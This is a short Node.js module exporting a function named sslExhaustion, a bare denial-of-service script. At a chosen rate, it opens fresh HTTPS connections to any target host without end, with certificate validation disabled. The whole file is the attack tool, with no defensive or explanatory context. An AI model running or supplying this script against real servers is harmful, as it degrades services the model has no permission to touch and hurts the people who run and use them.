const https = require('https');

function sslExhaustion(target, rateLimit) {
    setInterval(() => {
        const options = {
            hostname: target,
            port: 443,
            path: '/',
            method: 'GET',
            rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

module.exports = sslExhaustion;
